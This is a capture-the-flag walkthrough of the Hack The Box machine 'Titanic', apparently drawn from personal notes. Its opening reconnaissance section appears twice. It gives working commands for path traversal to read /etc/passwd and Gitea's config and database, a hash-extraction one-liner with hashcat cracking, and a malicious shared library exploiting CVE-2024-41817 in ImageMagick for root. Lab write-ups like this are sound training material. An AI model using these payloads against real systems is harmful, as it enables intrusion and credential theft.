---
title: Titanic
aliases:
  - Titanic
tags:
  - Easy
  - Linux
  - HTB
  - CTF
---
[_Titanic_](https://app.hackthebox.com/machines/Titanic) is an Easy Linux machine on HTB which allows you to practice virtual host enumeration, path traversal, gitea, PBKDF2 cracking and arbitrary code execution.

# Reconnaissance

Scanning port with Nmap.


The Scan shows us that port 80 is open.

Lets Visit http://10.10.11.15/
![[images/Pasted image 20250219173255.png]]

Adding titanic.htb to /etc/hosts




Now visiting titanic.htb
![[images/Pasted image 20250219173755.png]]

By enumerating , found a form on a page


We will try to capture requests in burp suite.






In this walkthrough, we will go through the steps I took to solve the Titanic CTF. This includes detailed explanations of the reconnaissance process, vulnerability exploitation, and privilege escalation techniques used to obtain the flags.

---

## 1. Reconnaissance

### Nmap Scan

I started with an Nmap scan to discover open ports and services:

```bash
sudo nmap -p- --min-rate=10000 10.10.11.55
```

![[images/Pasted image 20250219172728.png]]
The scan revealed two open ports:

- **22** - ssh
- **80** - http

Before exploring the web service, I added an entry to `/etc/hosts` for better navigation:

![[images/Pasted image 20250219173436.png]]
![[images/Pasted image 20250219173533.png]]

---

### Web Exploration on Port 80

I opened the web page on port 80 and was greeted with a "Book Now" form.

![[images/Pasted image 20250219174341.png]]

At this point, I did **not** immediately start virtual host enumeration. Instead, my curiosity led me to investigate the form's functionality. Using **Burp Suite**, I intercepted the request and response to analyze what happens when the form is submitted.

![[images/Pasted image 20250219174229.png]]

This is where things got interesting, I noticed the following request pattern:

```
GET /download?ticket=4087b9bc-e34d-4139-a577-60bcd3ec0c1c.json
```

This looked like a file download feature. I suspected a Path Traversal vulnerability, so I tested the following :

![[images/Pasted image 20250225171512.png]]

To my surprise, the `/etc/passwd` file was successfully downloaded. This confirmed a Path Traversal vulnerability.

---

### Discovering a User

While analyzing the contents of `/etc/passwd`, I discovered a developer account:

```
developer:x:1001:1001::/home/developer:/bin/bash
```

![[images/Pasted image 20250225171929.png]]

This indicated that a user named **developer** was present on the system. With this information, I proceeded with further enumeration.

---

## 2. Virtual Host Enumeration

After confirming the Path Traversal, I decided to look for subdomains using **ffuf**:

```bash
ffuf -c -w Seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://titanic.htb/" -H "Host: FUZZ.titanic.htb" -mc 200 
```

![[images/Pasted image 20250225172237.png]]

This revealed a virtual host:

```
dev.titanic.htb
```

I added this to my `/etc/hosts` file:

```plaintext
<titanic-IP> dev.titanic.htb
```

---

## 3. Gitea Instance on dev.titanic.htb

Navigating to `dev.titanic.htb`, I found a **Gitea** instance—an open-source self-hosted Git service. I explored the developer's repositories and found source code for the application, including `app.py`.

![[images/Pasted image 20250225172914.png]]

By reviewing the code manually, I recognized the potential for a Path Traversal vulnerability due to unsafe handling of user input in the `download` route. This matched the behavior I observed earlier when downloading `/etc/passwd`.


---

## 4. Path Traversal to Gitea Configuration

Knowing that Gitea was being used, I researched the default configuration file location. Gitea stores its configuration in `app.ini`, typically located at:

```
/data/gitea/conf/app.ini
```

![[images/Pasted image 20250225173209.png]]

I downloaded it using the Path Traversal exploit:

```bash
curl http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/conf/app.ini
```

![[images/Pasted image 20250225173300.png]]

This file contained the database location:

```
/data/gitea/gitea.db
```

I then downloaded the database file using:

```bash
wget http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db
```

![[images/Pasted image 20250225173457.png]]

---

## 5. Extracting and Cracking Gitea User Hashes

The next step was to extract the Gitea user hashes. I used `sqlite3` to query the database:

![[images/Pasted image 20250225173940.png]]

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

I then cracked the hashes using **Hashcat** and the **rockyou.txt** wordlist:

```bash
hashcat gitea.hashes /opt/SecLists/rockyou.txt --user
```

This revealed the **developer's password**.

---

## 6. SSH Access and Privilege Escalation

Using the cracked credentials, I SSH'd into the box as the **developer**:

```bash
ssh developer@titanic.htb
```

### Exploring Writable Directories

To find writable directories, I ran:

```bash
find / -writable -type d 2>/dev/null
```

This revealed:

```
/opt/app/
```

Inside `/opt/app/`, I found a directory named `scripts` containing the script `identify_images.sh`. This script called **ImageMagick** (`/usr/bin/magick`) to identify images in the `/opt/app/static/assets/images/` directory and logged metadata to `metadata.log`.

### Exploiting CVE-2024-41817

The version of ImageMagick was:

```
7.1.1-35
```

A quick search revealed that this version is vulnerable to **CVE-2024-41817**, which allows arbitrary code execution by loading malicious shared libraries from the current working directory.

From the `identify_images.sh` script, I knew the working directory was:

```
/opt/app/static/assets/images/
```

I crafted a malicious shared library to copy the root flag:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF
```

After waiting for the scheduled execution of `identify_images.sh`, I checked the directory and found:

```
root.txt
```

This file contained the **root flag**, completing the CTF!
